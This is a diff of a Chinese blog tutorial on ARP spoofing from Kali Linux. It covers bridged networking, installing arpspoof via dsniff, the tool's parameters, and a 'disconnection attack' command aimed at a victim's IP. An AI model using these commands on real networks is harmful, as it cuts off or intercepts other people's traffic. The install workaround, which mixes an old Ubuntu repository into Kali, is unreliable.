@@ -73,19 +73,61 @@
 <p>网络配置<br>需要配置为桥接模式</p>
 <p>配置桥接模式原因：<br>因为需要我们手动去配置IP地址和网关，IP地址要与主机的无线网的IP段对应，子网掩码，网关都需要和宿主机保持一致，这样子才可以在同一个局域网进行ARP欺骗攻击，如果是net模式攻击无法生效</p>
 <h2 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h2><p>配置第一步<br>打开编辑 ———&gt; 虚拟网络编辑器 ———&gt; 选择桥接模式</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207153928520.png" alt="image-20231207153928520"></p>
 <p>然后点击虚拟机 ———&gt; 设置 ———&gt; 把网络配置器设置为桥接模式</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207154018993.png" alt="image-20231207154018993"></p>
 <p>配置第二步<br>在本机Win+r，然后cmd回车，输入命令：ipconfig</p>
 <p>然后在kali终端输入命令，设置静态ip，需要设为和你局域内网同网段</p>
 <p>设置eth0网卡静态IP<br>命令：vi &#x2F;etc&#x2F;network&#x2F;interfaces</p>
 <p>然后在下面一排添加以下代码</p>
 <p>auto eth0 #eth0网卡开机启动<br>iface eth0 inet static #设置eth0网卡静态<br>IP address (你的IPv4 地址)<br>netmask (你的子网掩码）<br>gateway (你的默认网关)</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207151130093.png" alt="image-20231207151130093"></p>
 <p>然后保存并退出</p>
-<p>配置第三步<br>设置DNS    &#x2F;* 干净无广告，解析成功率相对来说更高，国内用户使用的比较多，而且速度相对快、稳定，是国内用户上网常用的DNS *&#x2F;</p>
-<p>在终端输入命令：vi &#x2F;etc&#x2F;resolv.conf</p>
-<p>需要修改为</p>
-<p>domain localdomain<br>search localdomain<br>nameserver 8.8.8.8<br>nameserver 114.114.114.114</p>
+<p>配置第三步<br>配置dns（在第二步中已完成） </p>
 <p>配置第四步<br>重启网络</p>
 <p>输入命令：service networking restart 或者 &#x2F;etc&#x2F;init.d&#x2F;networking restart</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207152126782.png" alt="image-20231207152126782"></p>
+<h2 id="安装arpspoof"><a href="#安装arpspoof" class="headerlink" title="安装arpspoof"></a>安装arpspoof</h2><p>在kali终端输入命令：apt-get install dsniff</p>
+<p>安装arpspoof踩坑<br>这是发现踩坑了，报错无法定位软件包</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207152838171.png" alt="image-20231207152838171"></p>
+<p>坑点解决方法<br>第一步<br>换源</p>
+<p>输入命令：</p>
+<p>cd &#x2F;etc&#x2F;apt&#x2F;</p>
+<p>cp sources.list sources.list.bb<br> vi sources.list</p>
+<p>更换源地址</p>
+<p>deb <a target="_blank" rel="noopener" href="http://archive.ubuntu.com/ubuntu/">http://archive.ubuntu.com/ubuntu/</a> trusty main universe restricted multiverseb  </p>
+<p>然后把第三排注释掉，在第三排下面加上源地址</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207153017866.png" alt="image-20231207153017866"></p>
+<p>第二步<br>安装</p>
+<p>输入命令：sudo apt-get update</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207153113585.png" alt="image-20231207153113585"></p>
+<p>然后又出来了一个坑点，出现了签名问题</p>
+<p>第三步<br>导入用户密钥</p>
+<p>输入命令：sudo apt-key adv –keyserver keyserver.ubuntu.com –recv-keys 3B4FE6ACC0B21F32</p>
+<p><img src="/../../../../Users/123/AppData/Roaming/Typora/typora-user-images/image-20231207153205291.png" alt="image-20231207153205291"></p>
+<p>第四步<br>安装</p>
+<p>输入命令：sudo apt-get update</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207153335515.png" alt="image-20231207153335515"></p>
+<p>输入命令：apt-get install dsniff ssldump</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207153431426.png" alt="image-20231207153431426"></p>
+<p>检验安装arpspoof是否成功<br>输入命令：arpspoof</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207153548361.png" alt="image-20231207153548361"></p>
+<p>出现了版本号等信息说明安装成功</p>
+<h2 id="Arpspoof的使用"><a href="#Arpspoof的使用" class="headerlink" title="Arpspoof的使用"></a>Arpspoof的使用</h2><p>参数</p>
+<p>-i interface 指定要使用的接口</p>
+<p>-c own|host|both 指定范围own|host|both （自己|主机|两者）</p>
+<p>-t target 指定一台特定主机进行ARP （如果未指定，则为LAN上的所有主机）</p>
+<p>-r 两个主机(主机和目标)以捕获两个方向的流量 （仅对-t有效）</p>
+<p>host 指定您希望抓取数据包的host （通常是本地网关）  </p>
+<p>示例 echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward #开启端口转发</p>
+<p>cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward #检测端口是否开启(1为开启 0为关闭)</p>
+<p>echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward #关闭端口转发</p>
+<p>sudo tc qdisc add dev eth0 root netem delay 200ms #限制网速200ms延时</p>
+<p>sudo tc qdisc del dev eth0 root netem delay 200ms #取消限制网速200ms延时</p>
+<p>arpspoof -i 网卡名 -t 欺骗的目标 我是谁</p>
+<p>arpspoof -i eth0 -t 受害者的IP 网关</p>
+<h2 id="断网攻击"><a href="#断网攻击" class="headerlink" title="断网攻击"></a>断网攻击</h2><p>按照命令“arpspoof -i eth0 -t 受害者的IP 网关”键入</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231207153816680.png" alt="image-20231207153816680"></p>
 
       
     </div>
